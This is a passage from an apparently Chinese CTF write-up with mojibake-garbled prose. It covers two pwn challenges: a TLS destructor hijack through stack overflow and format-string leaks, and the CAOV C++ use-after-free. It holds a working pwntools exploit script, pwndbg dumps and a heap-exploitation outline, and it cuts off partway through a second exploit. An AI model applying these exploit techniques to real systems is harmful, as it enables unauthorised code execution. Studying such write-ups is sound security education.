*__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>åœ¨å†…å­˜ä¸­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">rsp=0x7facd4d2bea8</span><br><span class="line"></span><br><span class="line">telescope 0x7facd4d2c700 100</span><br><span class="line">00:0000â”‚ r8 r9  0x7facd4d2c700 â—‚â€” 0x7facd4d2c700</span><br><span class="line">01:0008â”‚        0x7facd4d2c708 â€”â–¸ 0x563b164dc270 â—‚â€” 0x1</span><br><span class="line">02:0010â”‚        0x7facd4d2c710 â€”â–¸ 0x7facd4d2c700 â—‚â€” 0x7facd4d2c700</span><br><span class="line">03:0018â”‚        0x7facd4d2c718 â—‚â€” 0x1</span><br><span class="line">04:0020â”‚        0x7facd4d2c720 â—‚â€” 0x0</span><br><span class="line">05:0028â”‚        0x7facd4d2c728 â—‚â€” 0xfe0c23c58eab1200</span><br><span class="line">06:0030â”‚        0x7facd4d2c730 â—‚â€” 0x6bdca8fe08e79c2</span><br><span class="line">07:0038â”‚        0x7facd4d2c738 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">58:02c0â”‚        0x7facd4d2c9c0 â€”â–¸ 0x7facd53382b0 (stack_used) â—‚â€” 0x7facd4d2c9c0</span><br><span class="line">... â†“</span><br><span class="line">5a:02d0â”‚ r10    0x7facd4d2c9d0 â—‚â€” 0xb6c /* &#x27;l\x0b&#x27; */</span><br><span class="line">5b:02d8â”‚        0x7facd4d2c9d8 â€”â–¸ 0x7facd4d2c9e0 â—‚â€” 0x7facd4d2c9e0</span><br><span class="line">... â†“</span><br><span class="line">5d:02e8â”‚        0x7facd4d2c9e8 â—‚â€” 0xffffffffffffffe0</span><br><span class="line">5e:02f0â”‚        0x7facd4d2c9f0 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">60:0300â”‚        0x7facd4d2ca00 â€”â–¸ 0x7facd4d2bf10 â€”â–¸ 0x7facd4d2c700 â—‚â€” 0x7facd4d2c700</span><br><span class="line">61:0308â”‚        0x7facd4d2ca08 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>å¯è§,tlsæ˜¯åœ¨stackä¸Šçš„ï¼ˆæ¯”è¾ƒä¸‹é¢ï¼‰,å¯ä»¥é€šè¿‡å¤§èŒƒå›´çš„æ ˆæº¢å‡ºè¦†ç›–ã€‚</p><p>ä¹‹åæˆ‘ä»¬å‘é€â€™aâ€™*0x38+p64(canary)+â€™aâ€™*0x400ï¼ˆå¤§èŒƒå›´çš„è¦†ç›–ï¼‰ä¹‹åæŸ¥çœ‹ç¨‹åºçš„æµç¨‹å˜åŒ–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x563b14c06207</span> &lt;start_routine+<span class="number">110</span>&gt;    nop</span><br><span class="line">  <span class="number">0x563b14c06208</span> &lt;start_routine+<span class="number">111</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">8</span>]</span><br><span class="line">  <span class="number">0x563b14c0620c</span> &lt;start_routine+<span class="number">115</span>&gt;    sub    rax, qword ptr fs:[<span class="number">0x28</span>]</span><br><span class="line">  <span class="number">0x563b14c06215</span> &lt;start_routine+<span class="number">124</span>&gt;    je     start_routine+<span class="number">131</span> &lt;start_routine+<span class="number">131</span>&gt;</span><br><span class="line">   â†“</span><br><span class="line">  <span class="number">0x563b14c0621c</span> &lt;start_routine+<span class="number">131</span>&gt;    leave</span><br><span class="line">â–º <span class="number">0x563b14c0621d</span> &lt;start_routine+<span class="number">132</span>&gt;    ret             &lt;<span class="number">0x7facd51256db</span>; start_thread+<span class="number">219</span>&gt;</span><br><span class="line">   â†“</span><br><span class="line">  <span class="number">0x7facd51256db</span> &lt;start_thread+<span class="number">219</span>&gt;     mov    qword ptr fs:[<span class="number">0x630</span>], rax</span><br><span class="line">  <span class="number">0x7facd51256e4</span> &lt;start_thread+<span class="number">228</span>&gt;     call   __call_tls_dtors@plt &lt;__call_tls_dtors@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x7facd51256e9</span> &lt;start_thread+<span class="number">233</span>&gt;     xor    eax, eax</span><br></pre></td></tr></table></figure><p>å…¶ä¸­__call_tls_dtorså‡½æ•°æ¥ææ„çº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼Œdiassembleçœ‹ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble __call_tls_dtors</span><br><span class="line">Dump of assembler code for function __GI___call_tls_dtors:</span><br><span class="line">   0x00007facd4d70990 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00007facd4d70991 &lt;+1&gt;:push   rbx</span><br><span class="line">   0x00007facd4d70992 &lt;+2&gt;:sub    rsp,0x8</span><br><span class="line">   0x00007facd4d70996 &lt;+6&gt;:mov    rbp,QWORD PTR [rip+0x3a73c3]        # 0x7facd5117d60</span><br><span class="line">   0x00007facd4d7099d &lt;+13&gt;:mov    rbx,QWORD PTR fs:[rbp+0x0]</span><br><span class="line">   0x00007facd4d709a2 &lt;+18&gt;:test   rbx,rbx</span><br><span class="line">   0x00007facd4d709a5 &lt;+21&gt;:je     0x7facd4d709ee &lt;__GI___call_tls_dtors+94&gt;</span><br><span class="line">   0x00007facd4d709a7 &lt;+23&gt;:nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007facd4d709b0 &lt;+32&gt;:mov    rdx,QWORD PTR [rbx+0x18]</span><br><span class="line">   0x00007facd4d709b4 &lt;+36&gt;:mov    rax,QWORD PTR [rbx]</span><br><span class="line">   0x00007facd4d709b7 &lt;+39&gt;:mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x00007facd4d709bb &lt;+43&gt;:ror    rax,0x11</span><br><span class="line">   0x00007facd4d709bf &lt;+47&gt;:xor    rax,QWORD PTR fs:0x30</span><br><span class="line">   0x00007facd4d709c8 &lt;+56&gt;:mov    QWORD PTR fs:[rbp+0x0],rdx</span><br><span class="line">   0x00007facd4d709cd &lt;+61&gt;:call   rax</span><br><span class="line">   0x00007facd4d709cf &lt;+63&gt;:mov    rax,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x00007facd4d709d3 &lt;+67&gt;:lock sub QWORD PTR [rax+0x450],0x1</span><br><span class="line">   0x00007facd4d709dc &lt;+76&gt;:mov    rdi,rbx</span><br><span class="line">   0x00007facd4d709df &lt;+79&gt;:call   0x7facd4d4e2c8 &lt;free@plt&gt;</span><br><span class="line">   0x00007facd4d709e4 &lt;+84&gt;:mov    rbx,QWORD PTR fs:[rbp+0x0]</span><br><span class="line">   0x00007facd4d709e9 &lt;+89&gt;:test   rbx,rbx</span><br><span class="line">   0x00007facd4d709ec &lt;+92&gt;:jne    0x7facd4d709b0 &lt;__GI___call_tls_dtors+32&gt;</span><br><span class="line">   0x00007facd4d709ee &lt;+94&gt;:add    rsp,0x8</span><br><span class="line">   0x00007facd4d709f2 &lt;+98&gt;:pop    rbx</span><br><span class="line">   0x00007facd4d709f3 &lt;+99&gt;:pop    rbp</span><br><span class="line">   0x00007facd4d709f4 &lt;+100&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œmov rbx,QWORD PTR fs:[rbp+0x0]ä½¿å¾—æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºæ”¹å†™tlsçš„å†…å®¹ï¼ˆä¹Ÿå³fsï¼‰ï¼Œè¿›è€Œæ§åˆ¶rbxï¼Œä½¿å¾—å…¶ä¸è·³è½¬å¹¶ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚<br>rax,QWORD PTR [rbx]ï¼Œraxä¹Ÿå¯æ§ï¼Œåªæ˜¯è¦ç»è¿‡ror rax,0x11å’Œxor rax,QWORD PTR fs:0x30çš„è¿ç®—åç»“æœä¸ºone_gadgetï¼Œä¹‹åcall raxæ‹¿shellã€‚<br>å› æ­¤æˆ‘ä»¬å°±è¦æå‰å¸ƒç½®å¥½fsçš„å†…å®¹ã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol</span>(<span class="params">value</span>):</span><br><span class="line">low = (value&amp;<span class="number">0xffff800000000000</span>)&gt;&gt;<span class="number">47</span></span><br><span class="line">hight = (value&amp;<span class="number">0x7fffffffffff</span>)&lt;&lt;<span class="number">17</span></span><br><span class="line"><span class="keyword">return</span> hight | low</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">value</span>):</span><br><span class="line">hight = (value&amp;<span class="number">0x1ffff</span>)&lt;&lt;<span class="number">47</span></span><br><span class="line">low = (value&amp;<span class="number">0xfffffffffffe0000</span>)&gt;&gt;<span class="number">17</span></span><br><span class="line"><span class="keyword">return</span> hight | low</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">9999</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./x64_libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x0000000000400A5F&quot;)</span></span><br><span class="line">debug(<span class="number">0x0000000000011F1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;+%p-%p-%p-%p%-%p-%p-%p-%p%-%p-%p-%p-%p-%p+%p=&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>) - <span class="number">0x3ed8d0</span></span><br><span class="line">info(<span class="string">&#x27;libc : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;=&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary : &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%p&quot;</span>*(<span class="number">0x38</span>/<span class="number">2</span>)+p64(canary)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="built_in">hex</span>(libc.address-<span class="number">0x900</span>)*<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">xor1 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;0x&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;(nil)(nil)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">xor2 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;0x&quot;</span>)[:-<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line"><span class="comment"># info(&quot;xor1: &quot; + hex(xor1))</span></span><br><span class="line">info(<span class="string">&quot;xor2: &quot;</span> + <span class="built_in">hex</span>(xor2))</span><br><span class="line">xor1 = libc.address-<span class="number">0x1100</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">one = <span class="number">0x4f3c2</span> + libc.address</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x38</span>+p64(canary)*<span class="number">2</span>+p64(one)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x900</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address-<span class="number">0x1040</span>)+p64(rol((ror(xor2)^xor1)^one))</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">0xe8</span>+p64(<span class="number">0x3ec560</span>+libc.address)+p64(libc.address-<span class="number">0x248</span>)</span><br><span class="line">payload += p64(libc.address-<span class="number">0x10d8</span>)*<span class="number">0x10</span>+p64(libc.address-<span class="number">0x10d8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;./x64_libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./babyheap&quot;,checksec=False)</span></span><br><span class="line">main(args[<span class="string">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure><h4 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h4><p>ç¬¬äºŒé“å°±æ˜¯ä¸€é“C++çš„é¢˜ç›®äº†ï¼Œpwnable.twä¸Šçš„åŸé¢˜CAOVã€‚<br>æ¼æ´åœ¨äºæµ…æ‹·è´å¯¼è‡´çš„ææ„å‡½æ•°ä¼šdeleå­˜åœ¨äºstackä¸Šçš„æŒ‡é’ˆï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘çš„æ˜¯æˆ‘ä»¬çš„passwordç»“æ„ï¼Œä»è€Œåœ¨æˆ‘ä»¬å¯ä»¥åˆ©ç”¨chang_password()å½¢æˆç±»ä¼¼äºUAFçš„æ•ˆæœã€‚</p><p>æ¼æ´ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_info</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  initial((__int64)&amp;v4);</span><br><span class="line">  sub_401DDA((__int64)&amp;v5, (__int64)&amp;v4, (<span class="type">const</span> <span class="type">char</span> **)qword_6032A0);</span><br><span class="line">  dele((__int64)&amp;v5);    <span class="comment">//bug</span></span><br><span class="line">  v0 = sub_402164((__int64)&amp;v4);</span><br><span class="line">  v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;STUDENT: &quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v1, v0);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  sub_401E6C(qword_6032A0);</span><br><span class="line">  dele((__int64)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå±•ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000â”‚ rsp      0x7ffc82d0fa50 â€”â–¸ 0x1985c60 â—‚â€” &#x27;PB19000001&#x27;</span><br><span class="line">01:0008â”‚          0x7ffc82d0fa58 â—‚â€” 0x6400000064 /* &#x27;d&#x27; */</span><br><span class="line">... â†“</span><br><span class="line">03:0018â”‚          0x7ffc82d0fa68 â—‚â€” 0x21 /* &#x27;!&#x27; */</span><br><span class="line">04:0020â”‚ rax rdi  0x7ffc82d0fa70 â€”â–¸ 0x6032f0 â—‚â€” 0x0</span><br><span class="line">05:0028â”‚          0x7ffc82d0fa78 â—‚â€” 0x21 /* &#x27;!&#x27; */</span><br><span class="line">06:0030â”‚          0x7ffc82d0fa80 â—‚â€” 0x0</span><br><span class="line">07:0038â”‚          0x7ffc82d0fa88 â—‚â€” 0x3fdc5116f3e23a00</span><br></pre></td></tr></table></figure><p>ä½äºrsp+0x20çš„ä½ç½®å­˜åœ¨çš„0x6032f0ä¼šè¢«deleï¼Œç”±äºæˆ‘ä»¬æå‰change_passwordä½¿å¾—æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x6032e0</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000071</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000000000x0000000000000000</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000021</span><br><span class="line">0x603360:0x00000000006032f00x0000000000000021</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>ä»è€Œä¼šå°†å…¶deleåˆ°0x70çš„fastbinã€‚</p><p>ä¹‹åæˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x603270:0x00000000000000000x0000000000000000</span><br><span class="line">0x603280 &lt;stderr&gt;:0x00007f37cc70b5400x00007f37cc70b620</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x0000000001985c200x0000000000000000</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032c0:0x0000006e696d64610x0000000000000000</span><br><span class="line">0x6032d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000071</span><br><span class="line">0x6032f0:0x00000000000000000x0000000000000000</span><br><span class="line">0x603300:0x00000000000000000x0000000000000000</span><br><span class="line">0x603310:0x00000000000000000x0000000000000000</span><br><span class="line">0x603320:0x00000000000000000x0000000000000000</span><br><span class="line">0x603330:0x00000000000000000x0000000000000000</span><br><span class="line">0x603340:0x00000000000000000x0000000000000000</span><br><span class="line">0x603350:0x00000000000000000x0000000000000021</span><br><span class="line">0x603360:0x00000000006032f00x0000000000000021</span><br><span class="line">0x603370:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾€ä¸Šé¢çœ‹å‘ç°0x0000000001985c20ä¸ºä¸€ä¸ªå †åœ°å€ï¼Œå…¶heap[0]ä½ç½®çš„æŒ‡é’ˆæŒ‡å‘å­˜æ”¾studentâ€™s nameåœ°å€çš„åœ°å€ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡UAFå°†å †ç”³è¯·åˆ°0x603280é™„ä»¶ï¼ˆæ­£å¥½æœ‰0x7få¯ä»¥åˆ©ç”¨ï¼‰ï¼Œç„¶åä¿®æ”¹0x0001985c20ä¸ºä¸€ä¸ªå­˜æ”¾read_gotçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡change_passwordå®ç°ã€‚</p><p>æ•ˆæœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x6032e0-0x70</span><br><span class="line">0x603270:0x00000000000000000x0000000000000000</span><br><span class="line">0x603280 &lt;stderr&gt;:0x00007fa9e91f75400x00007fa9e91f7620</span><br><span class="line">0x603290:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032a0:0x00000000006033000x0000000000000000</span><br><span class="line">0x6032b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6032f0:0x00000a00000000000x0000000000000000</span><br><span class="line">0x603300:0x0000000000602f380x4141414141414100</span><br><span class="line">0x603310:0x41414141414141410x4141414141414141</span><br><span class="line">0x603320:0x41414141414141410x4141414141414141</span><br><span class="line">0x603330:0x41414141414141410x4141414141414141</span><br><span class="line">0x603340:0x41414141414141410x4141414141414141</span><br><span class="line">0x603350:0x000000000000000a0x0000000000000021</span><br><span class="line">pwndbg&gt; telescope 0x0000000000602f38</span><br><span class="line">00:0000â”‚   0x602f38 â€”â–¸ 0x7fa9e8f29310 (read) â—‚â€” cmp    dword ptr [rip + 0x2d2429], 0</span><br><span class="line">01:0008â”‚   0x602f40 â€”â–¸ 0x7fa9e8f77b50 (__strncmp_sse42) â—‚â€” test   rdx, rdx</span><br><span class="line">02:0010â”‚   0x602f48 â€”â–¸ 0x7fa9e8e52750 (__libc_start_main) â—‚â€” push   r14</span><br><span class="line">03:0018â”‚   0x602f50 â€”â–¸ 0x7fa9e8e6c290 (__cxa_atexit) â—‚â€” push   r12</span><br></pre></td></tr></table></figure><p>leakä¹‹ååˆ©ç”¨uafæ‰“malloc_hookï¼Œæ‹¿shellã€‚<br>å¯¹äº†ï¼ŒaddåŠŸèƒ½æ˜¯é€šè¿‡edit infoæ—¶ä¿®æ”¹nameæ—¶çš„newå®ç°çš„ï¼ŒdeleåŠŸèƒ½æ˜¯é€šè¿‡ææ„å®ç°çš„ã€‚</p><p>ruanå¸ˆå‚…çš„exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 